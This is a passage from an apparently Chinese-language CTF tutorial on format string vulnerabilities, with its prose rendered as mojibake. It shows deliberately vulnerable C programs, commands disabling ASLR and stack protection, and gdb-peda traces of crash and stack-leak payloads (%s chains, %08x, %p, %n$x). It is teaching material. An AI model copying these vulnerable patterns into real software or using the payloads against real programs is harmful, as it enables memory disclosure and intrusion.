   0x00000570 &lt;+51&gt;:    mov    ebx,eax
   0x00000572 &lt;+53&gt;:    call   0x3d0 &lt;printf@plt&gt;
   0x00000577 &lt;+58&gt;:    add    esp,0x10
   0x0000057a &lt;+61&gt;:    nop
   0x0000057b &lt;+62&gt;:    lea    esp,[ebp-0x8]
   0x0000057e &lt;+65&gt;:    pop    ecx
   0x0000057f &lt;+66&gt;:    pop    ebx
   0x00000580 &lt;+67&gt;:    pop    ebp
   0x00000581 &lt;+68&gt;:    lea    esp,[ecx-0x4]
   0x00000584 &lt;+71&gt;:    ret
End of assembler dump.
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0x56557000 --&gt; 0x1efc
EBX: 0x56557000 --&gt; 0x1efc
ECX: 0xffffd250 --&gt; 0x1
EDX: 0x5655561f (&quot;%s %d %s&quot;)
ESI: 0xf7f95000 --&gt; 0x1bbd90
EDI: 0x0
EBP: 0xffffd238 --&gt; 0x0
ESP: 0xffffd220 --&gt; 0x5655561f (&quot;%s %d %s&quot;)
EIP: 0x56555572 (&lt;main+53&gt;: call   0x565553d0 &lt;printf@plt&gt;)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555569 &lt;main+44&gt;:    lea    edx,[eax-0x19e1]
   0x5655556f &lt;main+50&gt;:    push   edx
   0x56555570 &lt;main+51&gt;:    mov    ebx,eax
=&gt; 0x56555572 &lt;main+53&gt;:    call   0x565553d0 &lt;printf@plt&gt;
   0x56555577 &lt;main+58&gt;:    add    esp,0x10
   0x5655557a &lt;main+61&gt;:    nop
   0x5655557b &lt;main+62&gt;:    lea    esp,[ebp-0x8]
   0x5655557e &lt;main+65&gt;:    pop    ecx
Guessed arguments:
arg[0]: 0x5655561f (&quot;%s %d %s&quot;)
arg[1]: 0x56555612 (&quot;Hello World!&quot;)
arg[2]: 0xe9
arg[3]: 0x56555610 --&gt; 0x6548000a ('\n')
[------------------------------------stack-------------------------------------]
0000| 0xffffd220 --&gt; 0x5655561f (&quot;%s %d %s&quot;)
0004| 0xffffd224 --&gt; 0x56555612 (&quot;Hello World!&quot;)
0008| 0xffffd228 --&gt; 0xe9
0012| 0xffffd22c --&gt; 0x56555610 --&gt; 0x6548000a ('\n')
0016| 0xffffd230 --&gt; 0xffffd250 --&gt; 0x1
0020| 0xffffd234 --&gt; 0x0
0024| 0xffffd238 --&gt; 0x0
0028| 0xffffd23c --&gt; 0xf7df1253 (&lt;__libc_start_main+243&gt;:   add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x56555572 in main ()
gdb-peda$ r
Continuing
Hello World! 233
[Inferior 1 (process 27416) exited with code 022]
</code></pre>
<p>æ ¹æ® cdecl çš„è°ƒç”¨çº¦å®šï¼Œåœ¨è¿›å…¥ <code>printf()</code> å‡½æ•°ä¹‹å‰ï¼Œå°†å‚æ•°ä»Žå³åˆ°å·¦ä¾æ¬¡åŽ‹æ ˆã€‚è¿›å…¥ <code>printf()</code> ä¹‹åŽï¼Œå‡½æ•°é¦–å…ˆèŽ·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸€æ¬¡è¯»å–ä¸€ä¸ªå­—ç¬¦ã€‚å¦‚æžœå­—ç¬¦ä¸æ˜¯ <code>%</code>ï¼Œå­—ç¬¦ç›´æŽ¥å¤åˆ¶åˆ°è¾“å‡ºä¸­ã€‚å¦åˆ™ï¼Œè¯»å–ä¸‹ä¸€ä¸ªéžç©ºå­—ç¬¦ï¼ŒèŽ·å–ç›¸åº”çš„å‚æ•°å¹¶è§£æžè¾“å‡ºã€‚ï¼ˆæ³¨æ„ï¼š<code>% d</code> å’Œ <code>%d</code> æ˜¯ä¸€æ ·çš„ï¼‰</p>
<p>æŽ¥ä¸‹æ¥æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ä¸Šé¢çš„ç¨‹åºï¼Œç»™æ ¼å¼å­—ç¬¦ä¸²åŠ ä¸Š <code>%x %x %x %3$s</code>ï¼Œä½¿å®ƒå‡ºçŽ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žï¼š</p>
<pre><code class="language-c">#include&lt;stdio.h&gt;
void main() {
    printf(&quot;%s %d %s %x %x %x %3$s&quot;, &quot;Hello World!&quot;, 233, &quot;\n&quot;);
}
</code></pre>
<p>åæ±‡ç¼–åŽçš„ä»£ç åŒä¸Šï¼Œæ²¡æœ‰ä»»ä½•åŒºåˆ«ã€‚æˆ‘ä»¬ä¸»è¦çœ‹ä¸€ä¸‹å‚æ•°ä¼ é€’ï¼š</p>
<pre><code class="language-text">gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0x56557000 --&gt; 0x1efc
EBX: 0x56557000 --&gt; 0x1efc
ECX: 0xffffd250 --&gt; 0x1
EDX: 0x5655561f (&quot;%s %d %s %x %x %x %3$s&quot;)
ESI: 0xf7f95000 --&gt; 0x1bbd90
EDI: 0x0
EBP: 0xffffd238 --&gt; 0x0
ESP: 0xffffd220 --&gt; 0x5655561f (&quot;%s %d %s %x %x %x %3$s&quot;)
EIP: 0x56555572 (&lt;main+53&gt;: call   0x565553d0 &lt;printf@plt&gt;)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555569 &lt;main+44&gt;:    lea    edx,[eax-0x19e1]
   0x5655556f &lt;main+50&gt;:    push   edx
   0x56555570 &lt;main+51&gt;:    mov    ebx,eax
=&gt; 0x56555572 &lt;main+53&gt;:    call   0x565553d0 &lt;printf@plt&gt;
   0x56555577 &lt;main+58&gt;:    add    esp,0x10
   0x5655557a &lt;main+61&gt;:    nop
   0x5655557b &lt;main+62&gt;:    lea    esp,[ebp-0x8]
   0x5655557e &lt;main+65&gt;:    pop    ecx
Guessed arguments:
arg[0]: 0x5655561f (&quot;%s %d %s %x %x %x %3$s&quot;)
arg[1]: 0x56555612 (&quot;Hello World!&quot;)
arg[2]: 0xe9
arg[3]: 0x56555610 --&gt; 0x6548000a ('\n')
[------------------------------------stack-------------------------------------]
0000| 0xffffd220 --&gt; 0x5655561f (&quot;%s %d %s %x %x %x %3$s&quot;)
0004| 0xffffd224 --&gt; 0x56555612 (&quot;Hello World!&quot;)
0008| 0xffffd228 --&gt; 0xe9
0012| 0xffffd22c --&gt; 0x56555610 --&gt; 0x6548000a ('\n')
0016| 0xffffd230 --&gt; 0xffffd250 --&gt; 0x1
0020| 0xffffd234 --&gt; 0x0
0024| 0xffffd238 --&gt; 0x0
0028| 0xffffd23c --&gt; 0xf7df1253 (&lt;__libc_start_main+243&gt;:   add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x56555572 in main ()
gdb-peda$ c
Continuing.
Hello World! 233
 ffffd250 0 0
[Inferior 1 (process 27480) exited with code 041]
</code></pre>
<p>è¿™ä¸€æ¬¡æ ˆçš„ç»“æž„å’Œä¸Šä¸€æ¬¡ç›¸åŒï¼Œåªæ˜¯æ ¼å¼å­—ç¬¦ä¸²æœ‰å˜åŒ–ã€‚ç¨‹åºæ‰“å°å‡ºäº†ä¸ƒä¸ªå€¼ï¼ˆåŒ…æ‹¬æ¢è¡Œï¼‰ï¼Œè€Œæˆ‘ä»¬å…¶å®žåªç»™å‡ºäº†å‰ä¸‰ä¸ªå€¼çš„å†…å®¹ï¼ŒåŽé¢çš„ä¸‰ä¸ª <code>%x</code> æ‰“å°å‡ºäº† <code>0xffffd230~0xffffd238</code> æ ˆå†…çš„æ•°æ®ï¼Œè¿™äº›éƒ½ä¸æ˜¯æˆ‘ä»¬è¾“å…¥çš„ã€‚è€Œæœ€åŽä¸€ä¸ªå‚æ•° <code>%3$s</code> æ˜¯å¯¹ <code>0xffffd22c</code> ä¸­ <code>\n</code> çš„é‡ç”¨ã€‚</p>
<p>ä¸Šä¸€ä¸ªä¾‹å­ä¸­ï¼Œæ ¼å¼å­—ç¬¦ä¸²ä¸­è¦æ±‚çš„å‚æ•°ä¸ªæ•°å¤§äºŽæˆ‘ä»¬æä¾›çš„å‚æ•°ä¸ªæ•°ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬çœåŽ»äº†æ ¼å¼å­—ç¬¦ä¸²ï¼ŒåŒæ ·å­˜åœ¨æ¼æ´žï¼š</p>
<pre><code class="language-c">#include&lt;stdio.h&gt;
void main() {
    char buf[50];
    if (fgets(buf, sizeof buf, stdin) == NULL)
        return;
    printf(buf);
}
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffffd1fa (&quot;Hello %x %x %x !\n&quot;)
EBX: 0x56557000 --&gt; 0x1ef8
ECX: 0xffffd1fa (&quot;Hello %x %x %x !\n&quot;)
EDX: 0xf7f9685c --&gt; 0x0
ESI: 0xf7f95000 --&gt; 0x1bbd90
EDI: 0x0
EBP: 0xffffd238 --&gt; 0x0
ESP: 0xffffd1e0 --&gt; 0xffffd1fa (&quot;Hello %x %x %x !\n&quot;)
EIP: 0x5655562a (&lt;main+77&gt;: call   0x56555450 &lt;printf@plt&gt;)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555623 &lt;main+70&gt;:    sub    esp,0xc
   0x56555626 &lt;main+73&gt;:    lea    eax,[ebp-0x3e]
   0x56555629 &lt;main+76&gt;:    push   eax
=&gt; 0x5655562a &lt;main+77&gt;:    call   0x56555450 &lt;printf@plt&gt;
   0x5655562f &lt;main+82&gt;:    add    esp,0x10
   0x56555632 &lt;main+85&gt;:    jmp    0x56555635 &lt;main+88&gt;
   0x56555634 &lt;main+87&gt;:    nop
   0x56555635 &lt;main+88&gt;:    mov    eax,DWORD PTR [ebp-0xc]
Guessed arguments:
arg[0]: 0xffffd1fa (&quot;Hello %x %x %x !\n&quot;)
[------------------------------------stack-------------------------------------]
0000| 0xffffd1e0 --&gt; 0xffffd1fa (&quot;Hello %x %x %x !\n&quot;)
0004| 0xffffd1e4 --&gt; 0x32 ('2')
0008| 0xffffd1e8 --&gt; 0xf7f95580 --&gt; 0xfbad2288
0012| 0xffffd1ec --&gt; 0x565555f4 (&lt;main+23&gt;: add    ebx,0x1a0c)
0016| 0xffffd1f0 --&gt; 0xffffffff
0020| 0xffffd1f4 --&gt; 0xffffd47a (&quot;/home/firmy/Desktop/RE4B/c.out&quot;)
0024| 0xffffd1f8 --&gt; 0x65485ea0
0028| 0xffffd1fc (&quot;llo %x %x %x !\n&quot;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x5655562a in main ()
gdb-peda$ c
Continuing.
Hello 32 f7f95580 565555f4 !
[Inferior 1 (process 28253) exited normally]
</code></pre>
<p>å¦‚æžœå¤§å®¶éƒ½æ˜¯å¥½å­©å­ï¼Œè¾“å…¥æ­£å¸¸çš„å­—ç¬¦ï¼Œç¨‹åºå°±ä¸ä¼šæœ‰é—®é¢˜ã€‚ç”±äºŽæ²¡æœ‰æ ¼å¼å­—ç¬¦ä¸²ï¼Œå¦‚æžœæˆ‘ä»¬åœ¨ <code>buf</code> ä¸­è¾“å…¥ä¸€äº›è½¬æ¢æŒ‡ç¤ºç¬¦ï¼Œåˆ™ <code>printf()</code> ä¼šæŠŠå®ƒå½“åšæ ¼å¼å­—ç¬¦ä¸²å¹¶è§£æžï¼Œæ¼æ´žå‘ç”Ÿã€‚ä¾‹å¦‚ä¸Šé¢æ¼”ç¤ºçš„æˆ‘ä»¬è¾“å…¥äº† <code>Hello %x %x %x !\n</code>ï¼ˆå…¶ä¸­ <code>\n</code> æ˜¯ <code>fgets()</code> å‡½æ•°ç»™æˆ‘ä»¬è‡ªåŠ¨åŠ ä¸Šçš„ï¼‰ï¼Œè¿™æ—¶ï¼Œç¨‹åºå°±ä¼šè¾“å‡ºæ ˆå†…çš„æ•°æ®ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºï¼Œå…¶å®žæ ¼å¼å­—ç¬¦ä¸²æ¼æ´žå‘ç”Ÿçš„æ¡ä»¶å°±æ˜¯æ ¼å¼å­—ç¬¦ä¸²è¦æ±‚çš„å‚æ•°å’Œå®žé™…æä¾›çš„å‚æ•°ä¸åŒ¹é…ã€‚ä¸‹é¢æˆ‘ä»¬è®¨è®ºä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li>
<p>ä¸ºä»€ä¹ˆå¯ä»¥é€šè¿‡ç¼–è¯‘ï¼Ÿ</p>
</li>
<li>
<p>å› ä¸º <code>printf()</code> å‡½æ•°çš„å‚æ•°è¢«å®šä¹‰ä¸ºå¯å˜çš„ã€‚</p>
</li>
<li>ä¸ºäº†å‘çŽ°ä¸åŒ¹é…çš„æƒ…å†µï¼Œç¼–è¯‘å™¨éœ€è¦ç†è§£ <code>printf()</code> æ˜¯æ€Žä¹ˆå·¥ä½œçš„å’Œæ ¼å¼å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆã€‚ç„¶è€Œï¼Œç¼–è¯‘å™¨å¹¶ä¸çŸ¥é“è¿™äº›ã€‚</li>
<li>
<p>æœ‰æ—¶æ ¼å¼å­—ç¬¦ä¸²å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œå®ƒå¯èƒ½åœ¨ç¨‹åºæ‰§è¡Œä¸­åŠ¨æ€ç”Ÿæˆã€‚</p>
</li>
<li>
<p><code>printf()</code></p>
</li>
</ul>
<p>å‡½æ•°è‡ªå·±å¯ä»¥å‘çŽ°ä¸åŒ¹é…å—ï¼Ÿ</p>
<ul>
<li><code>printf()</code> å‡½æ•°ä»Žæ ˆä¸­å–å‡ºå‚æ•°ï¼Œå¦‚æžœå®ƒéœ€è¦ 3 ä¸ªï¼Œé‚£å®ƒå°±å–å‡º 3 ä¸ªã€‚é™¤éžæ ˆçš„è¾¹ç•Œè¢«æ ‡è®°äº†ï¼Œå¦åˆ™ <code>printf()</code> æ˜¯ä¸ä¼šçŸ¥é“å®ƒå–å‡ºçš„å‚æ•°æ¯”æä¾›ç»™å®ƒçš„å‚æ•°å¤šäº†ã€‚ç„¶è€Œå¹¶æ²¡æœ‰è¿™æ ·çš„æ ‡è®°ã€‚</li>
</ul>
<h2 id="_7">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žåˆ©ç”¨</h2>
<p>é€šè¿‡æä¾›æ ¼å¼å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å°±èƒ½å¤ŸæŽ§åˆ¶æ ¼å¼åŒ–å‡½æ•°çš„è¡Œä¸ºã€‚æ¼æ´žçš„åˆ©ç”¨ä¸»è¦æœ‰ä¸‹é¢å‡ ç§ã€‚</p>
<h3 id="_8">ä½¿ç¨‹åºå´©æºƒ</h3>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žé€šå¸¸è¦åœ¨ç¨‹åºå´©æºƒæ—¶æ‰ä¼šè¢«å‘çŽ°ï¼Œæ‰€ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žæœ€ç®€å•çš„æ–¹å¼å°±æ˜¯ä½¿è¿›ç¨‹å´©æºƒã€‚åœ¨ Linux ä¸­ï¼Œå­˜å–æ— æ•ˆçš„æŒ‡é’ˆä¼šå¼•èµ·è¿›ç¨‹æ”¶åˆ° <code>SIGSEGV</code> ä¿¡å·ï¼Œä»Žè€Œä½¿ç¨‹åºéžæ­£å¸¸ç»ˆæ­¢å¹¶äº§ç”Ÿæ ¸å¿ƒè½¬å‚¨ï¼ˆåœ¨ Linux åŸºç¡€çš„ç« èŠ‚ä¸­è¯¦ç»†ä»‹ç»äº†æ ¸å¿ƒè½¬å‚¨ï¼‰ã€‚æˆ‘ä»¬çŸ¥é“æ ¸å¿ƒè½¬å‚¨ä¸­å­˜å‚¨äº†ç¨‹åºå´©æºƒæ—¶çš„è®¸å¤šé‡è¦ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æ­£æ˜¯æ”»å‡»è€…æ‰€éœ€è¦çš„ã€‚</p>
<p>åˆ©ç”¨ç±»ä¼¼ä¸‹é¢çš„æ ¼å¼å­—ç¬¦ä¸²å³å¯è§¦å‘æ¼æ´žï¼š</p>
<pre><code class="language-c">printf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;)
</code></pre>
<ul>
<li>å¯¹äºŽæ¯ä¸€ä¸ª <code>%s</code>ï¼Œ<code>printf()</code> éƒ½è¦ä»Žæ ˆä¸­èŽ·å–ä¸€ä¸ªæ•°å­—ï¼ŒæŠŠè¯¥æ•°å­—è§†ä¸ºä¸€ä¸ªåœ°å€ï¼Œç„¶åŽæ‰“å°å‡ºåœ°å€æŒ‡å‘çš„å†…å­˜å†…å®¹ï¼Œç›´åˆ°å‡ºçŽ°ä¸€ä¸ª NULL å­—ç¬¦ã€‚</li>
<li>å› ä¸ºä¸å¯èƒ½èŽ·å–çš„æ¯ä¸€ä¸ªæ•°å­—éƒ½æ˜¯åœ°å€ï¼Œæ•°å­—æ‰€å¯¹åº”çš„å†…å­˜å¯èƒ½å¹¶ä¸å­˜åœ¨ã€‚</li>
<li>è¿˜æœ‰å¯èƒ½èŽ·å¾—çš„æ•°å­—ç¡®å®žæ˜¯ä¸€ä¸ªåœ°å€ï¼Œä½†æ˜¯è¯¥åœ°å€æ˜¯è¢«ä¿æŠ¤çš„ã€‚</li>
</ul>
<h3 id="_9">æŸ¥çœ‹æ ˆå†…å®¹</h3>
<p>ä½¿ç¨‹åºå´©æºƒåªæ˜¯éªŒè¯æ¼æ´žçš„ç¬¬ä¸€æ­¥ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°æ¥èŽ·å¾—å†…å­˜çš„å†…å®¹ï¼Œä¸ºä¸‹ä¸€æ­¥æ¼æ´žåˆ©ç”¨åšå‡†å¤‡ã€‚æˆ‘ä»¬å·²ç»çŸ¥é“äº†ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä¼šæ ¹æ®æ ¼å¼å­—ç¬¦ä¸²ä»Žæ ˆä¸Šå–å€¼ã€‚ç”±äºŽåœ¨ x86 ä¸Šæ ˆç”±é«˜åœ°å€å‘ä½Žåœ°å€å¢žé•¿ï¼Œè€Œ <code>printf()</code> å‡½æ•°çš„å‚æ•°æ˜¯ä»¥é€†åºè¢«åŽ‹å…¥æ ˆçš„ï¼Œæ‰€ä»¥å‚æ•°åœ¨å†…å­˜ä¸­å‡ºçŽ°çš„é¡ºåºä¸Žåœ¨ <code>printf()</code> è°ƒç”¨æ—¶å‡ºçŽ°çš„é¡ºåºæ˜¯ä¸€è‡´çš„ã€‚</p>
<p>ä¸‹é¢çš„æ¼”ç¤ºæˆ‘ä»¬éƒ½ä½¿ç”¨ä¸‹é¢çš„<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/src/others/3.1.1_format_string/fmt_2.c">æºç </a>ï¼š</p>
<pre><code class="language-c">#include&lt;stdio.h&gt;
void main() {
    char format[128];
    int arg1 = 1, arg2 = 0x88888888, arg3 = -1;
    char arg4[10] = &quot;ABCD&quot;;
    scanf(&quot;%s&quot;, format);
    printf(format, arg1, arg2, arg3, arg4);
    printf(&quot;\n&quot;);
}
# echo 0 &gt; /proc/sys/kernel/randomize_va_space
$ gcc -m32 -fno-stack-protector -no-pie fmt.c
</code></pre>
<p>æˆ‘ä»¬å…ˆè¾“å…¥ <code>b main</code> è®¾ç½®æ–­ç‚¹ï¼Œä½¿ç”¨ <code>n</code> å¾€ä¸‹æ‰§è¡Œï¼Œåœ¨ <code>call 0x56555460 &lt;__isoc99_scanf@plt&gt;</code> å¤„è¾“å…¥ <code>%08x.%08x.%08x.%08x.%08x</code>ï¼Œç„¶åŽä½¿ç”¨ <code>c</code> ç»§ç»­æ‰§è¡Œï¼Œå³å¯è¾“å‡ºç»“æžœã€‚</p>
<pre><code class="language-text">gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffffd584 (&quot;%08x.%08x.%08x.%08x.%08x&quot;)
EBX: 0x56557000 --&gt; 0x1efc
ECX: 0x1
EDX: 0xf7f9883c --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --&gt; 0x0
ESP: 0xffffd550 --&gt; 0xffffd584 (&quot;%08x.%08x.%08x.%08x.%08x&quot;)
EIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]
   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]
   0x56555641 &lt;main+132&gt;:       push   eax
=&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;
   0x56555647 &lt;main+138&gt;:       add    esp,0x20
   0x5655564a &lt;main+141&gt;:       sub    esp,0xc
   0x5655564d &lt;main+144&gt;:       push   0xa
   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;
Guessed arguments:
arg[0]: 0xffffd584 (&quot;%08x.%08x.%08x.%08x.%08x&quot;)
arg[1]: 0x1
arg[2]: 0x88888888
arg[3]: 0xffffffff
arg[4]: 0xffffd57a (&quot;ABCD&quot;)
[------------------------------------stack-------------------------------------]
0000| 0xffffd550 --&gt; 0xffffd584 (&quot;%08x.%08x.%08x.%08x.%08x&quot;)
0004| 0xffffd554 --&gt; 0x1
0008| 0xffffd558 --&gt; 0x88888888
0012| 0xffffd55c --&gt; 0xffffffff
0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)
0020| 0xffffd564 --&gt; 0xffffd584 (&quot;%08x.%08x.%08x.%08x.%08x&quot;)
0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)
0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x56555642 in main ()
gdb-peda$ x/10x $esp
0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff
0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7
0xffffd570:     0xf7ffda54      0x00000001
gdb-peda$ c
Continuing.
00000001.88888888.ffffffff.ffffd57a.ffffd584
</code></pre>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸² <code>0xffffd584</code> çš„åœ°å€å‡ºçŽ°åœ¨å†…å­˜ä¸­çš„ä½ç½®æ°å¥½ä½äºŽå‚æ•° <code>arg1</code>ã€<code>arg2</code>ã€<code>arg3</code>ã€<code>arg4</code> ä¹‹å‰ã€‚æ ¼å¼å­—ç¬¦ä¸² <code>%08x.%08x.%08x.%08x.%08x</code> è¡¨ç¤ºå‡½æ•° <code>printf()</code> ä»Žæ ˆä¸­å–å‡º 5 ä¸ªå‚æ•°å¹¶å°†å®ƒä»¬ä»¥ 8 ä½åå…­è¿›åˆ¶æ•°çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ã€‚æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°ä½¿ç”¨ä¸€ä¸ªå†…éƒ¨å˜é‡æ¥æ ‡å¿—ä¸‹ä¸€ä¸ªå‚æ•°çš„ä½ç½®ã€‚å¼€å§‹æ—¶ï¼Œå‚æ•°æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆ<code>arg1</code>ï¼‰ã€‚éšç€æ¯ä¸€ä¸ªå‚æ•°è¢«ç›¸åº”çš„æ ¼å¼è§„èŒƒæ‰€è€—ç”¨ï¼Œå‚æ•°æŒ‡é’ˆçš„å€¼ä¹Ÿæ ¹æ®å‚æ•°çš„é•¿åº¦ä¸æ–­é€’å¢žã€‚åœ¨æ˜¾ç¤ºå®Œå½“å‰æ‰§è¡Œå‡½æ•°çš„å‰©ä½™è‡ªåŠ¨å˜é‡ä¹‹åŽï¼Œ<code>printf()</code> å°†æ˜¾ç¤ºå½“å‰æ‰§è¡Œå‡½æ•°çš„æ ˆå¸§ï¼ˆåŒ…æ‹¬è¿”å›žåœ°å€å’Œå‚æ•°ç­‰ï¼‰ã€‚</p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>%p.%p.%p.%p.%p</code> å¾—åˆ°ç›¸ä¼¼çš„ç»“æžœã€‚</p>
<pre><code class="language-text">gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)
EBX: 0x56557000 --&gt; 0x1efc
ECX: 0x1
EDX: 0xf7f9883c --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --&gt; 0x0
ESP: 0xffffd550 --&gt; 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)
EIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]
   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]
   0x56555641 &lt;main+132&gt;:       push   eax
=&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;
   0x56555647 &lt;main+138&gt;:       add    esp,0x20
   0x5655564a &lt;main+141&gt;:       sub    esp,0xc
   0x5655564d &lt;main+144&gt;:       push   0xa
   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;
Guessed arguments:
arg[0]: 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)
arg[1]: 0x1
arg[2]: 0x88888888
arg[3]: 0xffffffff
arg[4]: 0xffffd57a (&quot;ABCD&quot;)
[------------------------------------stack-------------------------------------]
0000| 0xffffd550 --&gt; 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)
0004| 0xffffd554 --&gt; 0x1
0008| 0xffffd558 --&gt; 0x88888888
0012| 0xffffd55c --&gt; 0xffffffff
0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)
0020| 0xffffd564 --&gt; 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)
0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)
0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x56555642 in main ()
gdb-peda$ c
Continuing.
0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584
</code></pre>
<p>ä¸Šé¢çš„æ–¹æ³•éƒ½æ˜¯ä¾æ¬¡èŽ·å¾—æ ˆä¸­çš„å‚æ•°ï¼Œå¦‚æžœæˆ‘ä»¬æƒ³è¦ç›´æŽ¥èŽ·å¾—è¢«æŒ‡å®šçš„æŸä¸ªå‚æ•°ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä¸‹é¢çš„æ ¼å¼å­—ç¬¦ä¸²ï¼š</p>
<pre><code class="language-text">%&lt;arg#&gt;$&lt;format&gt;

%n$x
</code></pre>
<p>è¿™é‡Œçš„ <code>n</code> è¡¨ç¤ºæ ˆä¸­æ ¼å¼å­—ç¬¦ä¸²åŽé¢çš„ç¬¬ <code>n</code> ä¸ªå€¼ã€‚</p>
<pre><code class="language-text">gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffffd584 (&quot;%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p&quot;)
EBX: 0x56557000 --&gt; 0x1efc
ECX: 0x1
EDX: 0xf7f9883c --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --&gt; 0x0
ESP: 0xffffd550 --&gt; 0xffffd584 (&quot;%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p&quot;)
EIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]
   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]
   0x56555641 &lt;main+132&gt;:       push   eax
=&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;
   0x56555647 &lt;main+138&gt;:       add    esp,0x20
   0x5655564a &lt;main+141&gt;:       sub    esp,0xc
   0x5655564d &lt;main+144&gt;:       push   0xa
   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;
Guessed arguments:
arg[0]: 0xffffd584 (&quot;%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p&quot;)
arg[1]: 0x1
arg[2]: 0x88888888
arg[3]: 0xffffffff
arg[4]: 0xffffd57a (&quot;ABCD&quot;)
[------------------------------------stack-------------------------------------]
0000| 0xffffd550 --&gt; 0xffffd584 (&quot;%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p&quot;)
0004| 0xffffd554 --&gt; 0x1
0008| 0xffffd558 --&gt; 0x88888888
0012| 0xffffd55c --&gt; 0xffffffff
0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)
